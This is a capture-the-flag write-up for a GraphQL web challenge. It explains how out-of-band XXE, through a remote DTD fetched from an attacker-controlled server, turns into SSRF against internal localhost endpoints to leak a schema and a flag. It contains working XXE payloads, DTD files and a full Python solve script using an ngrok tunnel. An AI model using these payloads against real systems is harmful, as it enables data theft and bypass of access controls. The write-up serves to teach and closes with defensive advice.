# Graph Grief (25 pts - Web Exploitation)

## Challenge Description

> AetherCorp has been running this old service for years. Nobody really knows who built it, or why parts of it still depend on outdated systems. The files are messy, the documentation is gone, and every department claims someone else maintains it. Now it's acting strange again, and they just pushed it onto your environment without explanation. Whatever is inside this system... it wasn't meant to stay buried forever.

**Author:** Expli0it3r  
**URL:** `https://grief.chals.nitectf25.live/`

## TL;DR

OOB XXE via external DTD hosted on attacker server → SSRF into `127.0.0.1:8000` internal endpoints → leak `schema.graphql` via `/internal/file` → retrieve flag via `/internal/graphql` (IP-restricted, bypassed because the server queries itself as localhost).

## Initial Analysis

The landing page described a GraphQL API with a **Legacy XML Bridge** note:

> _"Legacy XML importer may trigger internal file utilities"_

This was an immediate signal for **XXE**. The `/graphql` endpoint accepted both `application/json` and `application/xml`.

```bash
# Confirmed XML processing
curl -X POST https://grief.chals.nitectf25.live/graphql \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><query>{ __typename }</query>'
```

**GraphQL introspection was disabled**, so standard schema discovery was not possible.

### Reconnaissance via JSON

Using JSON, we could enumerate available types and data:

```bash
# Discovered available queries
curl -s https://grief.chals.nitectf25.live/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { id username role fullName } }"}'

# 20 users with roles: customer, admin, support
# Also found: profiles, orders, products, auditLogs queries
```

The `auditLogs` query was publicly accessible and contained a critical hint:

```json
{
  "targetNodeId": "c2VjcmV0OmZsYWc=",
  "action": "ACCESS_ATTEMPT",
  "details": "Unauthorized access attempt to secret node"
}
```

Base64-decoding `c2VjcmV0OmZsYWc=` → `secret:flag` — the flag lives in a `secret` type node, but it's IP-whitelisted to `127.0.0.1` only.

### WAF Analysis

Direct XXE with `file://` was blocked by a custom WAF (`reject-file-xxe.js`):

```
Error: General SYSTEM entities are not allowed
```

However, the WAF only blocked local file schemes. **Remote DTDs via HTTP/HTTPS were allowed.**

## Solution

The attack required hosting a public HTTP server (using ngrok) to serve malicious DTD files, which the XML parser would fetch and execute. This is **Out-of-Band (OOB) XXE**.

### Step 1: Leak the GraphQL Schema

Create `schema.dtd` on your server:

```xml
<!ENTITY sch SYSTEM "http://127.0.0.1:8000/internal/file?name=schema.graphql">
```

Send to `/graphql`:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "https://ATTACKER_SERVER/schema.dtd">
  %remote;
]>
<root>&sch;</root>
```

The server fetches our DTD, resolves `&sch;` by calling `http://127.0.0.1:8000/internal/file?name=schema.graphql` (from localhost — bypassing IP restriction), and returns the Base64-encoded schema in the response.

Decoded schema revealed:

```graphql
type secret {
  flag: String
}
# And the node interface — accessible only from 127.0.0.1:8000
```

### Step 2: Query the Flag via Internal GraphQL

Construct the flag query:

```python
import base64, urllib.parse

node_id = base64.b64encode(b"secret:flag").decode()   # c2VjcmV0OmZsYWc=
query = f'{{node(id:"{node_id}"){{...on secret{{flag}}}}}}'
encoded_query = urllib.parse.quote(query)
```

Create `flag.dtd`:

```xml
<!ENTITY flg SYSTEM "http://127.0.0.1:8000/internal/graphql?query=ENCODED_QUERY">
```

Send the second XML payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "https://ATTACKER_SERVER/flag.dtd">
  %remote;
]>
<root>&flg;</root>
```

The server again fetches our DTD → resolves `&flg;` → executes the GraphQL query against itself as `127.0.0.1` → returns the flag.

### Complete Solve Script

```python
import threading, requests, base64, urllib.parse, re, os
from http.server import SimpleHTTPRequestHandler, HTTPServer
from pyngrok import ngrok

TARGET_URL = "https://grief.chals.nitectf25.live/graphql"
LOCAL_PORT = 8078

class QuietHandler(SimpleHTTPRequestHandler):
    def log_message(self, format, *args): pass

# Start local HTTP server to serve DTD files
threading.Thread(
    target=lambda: HTTPServer(('0.0.0.0', LOCAL_PORT), QuietHandler).serve_forever(),
    daemon=True
).start()

try:
    public_url = ngrok.connect(LOCAL_PORT).public_url
    print(f"[*] ngrok tunnel: {public_url}")

    # Step 1: Leak schema
    with open("schema.dtd", "w") as f:
        f.write('<!ENTITY sch SYSTEM "http://127.0.0.1:8000/internal/file?name=schema.graphql">')

    xml_schema = (
        f'<?xml version="1.0"?>'
        f'<!DOCTYPE root [<!ENTITY % remote SYSTEM "{public_url}/schema.dtd">%remote;]>'
        f'<root>&sch;</root>'
    )
    res = requests.post(TARGET_URL, data=xml_schema, headers={"Content-Type": "application/xml"}).text
    decoded_schema = base64.b64decode(res).decode()
    print(f"[+] Schema leaked:\n{decoded_schema}\n")

    # Step 2: Check auditLogs for secret node ID
    logs = requests.post(TARGET_URL, json={"query": "{ auditLogs { targetNodeId action details } }"}).json()
    print(f"[+] Audit logs:\n{logs}\n")

    # Step 3: Query the flag via internal graphql
    node_id = base64.b64encode(b"secret:flag").decode()
    query = urllib.parse.quote(f'{{node(id:"{node_id}"){{...on secret{{flag}}}}}}')

    with open("flag.dtd", "w") as f:
        f.write(f'<!ENTITY flg SYSTEM "http://127.0.0.1:8000/internal/graphql?query={query}">')

    xml_flag = (
        f'<?xml version="1.0"?>'
        f'<!DOCTYPE root [<!ENTITY % remote SYSTEM "{public_url}/flag.dtd">%remote;]>'
        f'<root>&flg;</root>'
    )
    res_flag = requests.post(TARGET_URL, data=xml_flag, headers={"Content-Type": "application/xml"}).text
    flag = re.search(r'nite\{[^}]+\}', res_flag)
    print(f"[+] Flag: {flag.group(0) if flag else res_flag}")

finally:
    ngrok.kill()
    for f in ["schema.dtd", "flag.dtd"]:
        if os.path.exists(f): os.remove(f)
```

## What We Tried During the Competition

During the CTF we explored extensively:

- GraphQL introspection bypass attempts
- Node ID enumeration (base64-encoded `Type:id` patterns — found users, profiles, orders)
- Aliased query attacks and batching (batching was explicitly disabled)
- Probing all Object types for hidden fields (`secret`, `flag`, `apiKey` fields returned validation errors)
- Standard `file://` XXE — blocked by the WAF
- `auditLogs` successfully decoded to reveal `secret:flag` as the target node ID

The missing piece was the **OOB XXE via external DTD** to bypass both the WAF and the IP restriction simultaneously.

## Flag

```
nite{Th3_Qu4ntum_Ent1ty_H4s_B33n_Summ0n3d}
```

## Key Takeaways

- **OOB XXE** — when in-band (`file://`) is blocked, parameter entities + remote DTDs can still exfiltrate data by having the server make outbound HTTP requests
- **WAF bypass logic** — blocking `file://` while allowing `http://` for DTDs is a common misconfiguration that enables OOB
- **SSRF via XXE** — the DTD entity resolved by the XML parser runs in the context of the server, making internal HTTP calls as `127.0.0.1` — bypassing IP whitelists
- **GraphQL audit logs as a recon vector** — publicly accessible audit logs leaking internal node IDs is a data exposure vulnerability on its own
- **Defense:** Disable external entity processing entirely in production XML parsers; never expose audit logs publicly; use network segmentation rather than IP whitelisting as the sole auth mechanism

## Tools Used

- `curl` — manual GraphQL and XML exploration
- Python `requests` — automated payload delivery
- `pyngrok` — expose local DTD server publicly
- `flask` / `http.server` — serve malicious DTD files
- `base64` — decode schema, encode node IDs
- Browser DevTools — initial recon of the JavaScript frontend
